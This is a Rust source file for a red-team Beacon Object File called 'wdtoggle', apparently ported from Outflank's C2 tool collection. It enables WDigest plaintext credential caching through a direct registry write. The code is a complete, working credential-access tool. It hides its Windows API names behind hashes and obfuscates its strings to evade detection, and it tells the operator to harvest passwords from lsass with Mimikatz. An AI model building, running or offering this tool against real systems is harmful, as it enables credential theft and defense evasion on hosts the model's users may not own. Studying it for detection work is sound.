// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Original C: Outflank/C2-Tool-Collection — wdtoggle/
//
//! `wdtoggle` — WDigest credential caching toggle via direct registry write.
//!
//! Writes HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest!
//! UseLogonCredential = 1 (enable) or 0 (disable) via DFR advapi32 calls.
//! The next interactive logon after enabling will store plaintext credentials
//! in lsass.exe memory, retrievable via Mimikatz sekurlsa::wdigest.
//!
//! Registry path and value name are obfuscated at compile time via obfstr.
//! No reg.exe, no PowerShell — pure direct Win32 via DFR.
//!
//! MITRE: T1003.001 (OS Credential Dumping: LSASS Memory),
//!        T1112   (Modify Registry)

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1003.001", name: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access" },
    Technique { id: "T1112",     name: "Modify Registry",                      tactic: "Defense Evasion"   },
];

// ─── Operator toggle ──────────────────────────────────────────────────────────
// Recompile with `false` to disable WDigest caching.
const ENABLE: bool = true;

// ─── Registry constants ───────────────────────────────────────────────────────
// HKEY_LOCAL_MACHINE predefined handle (0x80000002 sign-extended to isize)
const HKEY_LOCAL_MACHINE: isize = 0x8000_0002u32 as i32 as isize;
const KEY_QUERY_VALUE:     u32   = 0x0001;
const KEY_SET_VALUE:       u32   = 0x0002;
const REG_DWORD:           u32   = 4;

// ─── Precomputed API hashes — names never appear in .rdata ───────────────────
const HASH_REG_OPEN_KEY_EX_W:   u32 = common::hash::djb2(b"RegOpenKeyExW");
const HASH_REG_SET_VALUE_EX_W:  u32 = common::hash::djb2(b"RegSetValueExW");
const HASH_REG_CLOSE_KEY:       u32 = common::hash::djb2(b"RegCloseKey");

// ─── DFR declarations ─────────────────────────────────────────────────────────
// The `api` literals are only ever evaluated at const-time inside dfr_fn! to
// produce the A hash constant — they do NOT survive into .rdata on an optimised
// release build. The top-level HASH_* consts above document the precomputed values.
dfr_fn!(
    reg_open_key_ex_w(
        h_key:       isize,
        sub_key:     *const u16,
        options:     u32,
        sam_desired: u32,
        result:      *mut isize,
    ) -> i32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExW"
);

dfr_fn!(
    reg_set_value_ex_w(
        h_key:      isize,
        value_name: *const u16,
        reserved:   u32,
        ty:         u32,
        data:       *const u8,
        data_len:   u32,
    ) -> i32,
    module = "advapi32.dll",
    api    = "RegSetValueExW"
);

dfr_fn!(
    reg_close_key(h_key: isize) -> i32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

// ─── Entry point ──────────────────────────────────────────────────────────────

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(())  => {},
        Err(e)  => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // Confirm precomputed hashes are live (prevent dead-code elimination).
    let _ = (HASH_REG_OPEN_KEY_EX_W, HASH_REG_SET_VALUE_EX_W, HASH_REG_CLOSE_KEY);

    // ── Build wide registry path on stack (obfuscated source literal) ─────────
    // obf!() decrypts at runtime; the plaintext never appears in .rdata.
    obf! { let reg_path_a = r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"; }
    let mut reg_path_w = [0u16; 128];
    common::str_util::ascii_to_wide_buf(reg_path_a.as_bytes(), &mut reg_path_w);

    // ── Build wide value name on stack ────────────────────────────────────────
    obf! { let val_name_a = "UseLogonCredential"; }
    let mut val_name_w = [0u16; 32];
    common::str_util::ascii_to_wide_buf(val_name_a.as_bytes(), &mut val_name_w);

    // ── Step 1: Open the WDigest registry key ────────────────────────────────
    let mut hkey: isize = 0;
    let rc = unsafe {
        reg_open_key_ex_w(
            HKEY_LOCAL_MACHINE,
            reg_path_w.as_ptr(),
            0,
            KEY_QUERY_VALUE | KEY_SET_VALUE,
            &mut hkey,
        )
    }.map_err(|_| "open key failed")?;

    if rc != 0 {
        return Err("open key returned error");
    }

    // ── Step 2: Write UseLogonCredential DWORD ────────────────────────────────
    let value: u32 = if ENABLE { 1 } else { 0 };
    let rc2 = unsafe {
        reg_set_value_ex_w(
            hkey,
            val_name_w.as_ptr(),
            0,
            REG_DWORD,
            &value as *const u32 as *const u8,
            4,
        )
    }.map_err(|_| "set value failed")?;

    // ── Step 3: Close the key ─────────────────────────────────────────────────
    let _ = unsafe { reg_close_key(hkey) };

    if rc2 != 0 {
        return Err("set value returned error");
    }

    // ── Operator output ───────────────────────────────────────────────────────
    // obf!() ensures these strings are decrypted at runtime; no plaintext in .rdata.
    if ENABLE {
        obf! { let msg_en1 = "[+] wdtoggle: WDigest caching ENABLED"; }
        obf! { let msg_en2 = "[*] wdtoggle: Plaintext credentials will be cached in lsass on next logon."; }
        obf! { let msg_en3 = "[*] wdtoggle: Retrieve with: sekurlsa::wdigest"; }
        println!("{}", msg_en1);
        println!("{}", msg_en2);
        println!("{}", msg_en3);
    } else {
        obf! { let msg_dis1 = "[+] wdtoggle: WDigest caching DISABLED"; }
        obf! { let msg_dis2 = "[*] wdtoggle: Plaintext credential caching cleared (takes effect on next logon)."; }
        println!("{}", msg_dis1);
        println!("{}", msg_dis2);
    }

    Ok(())
}
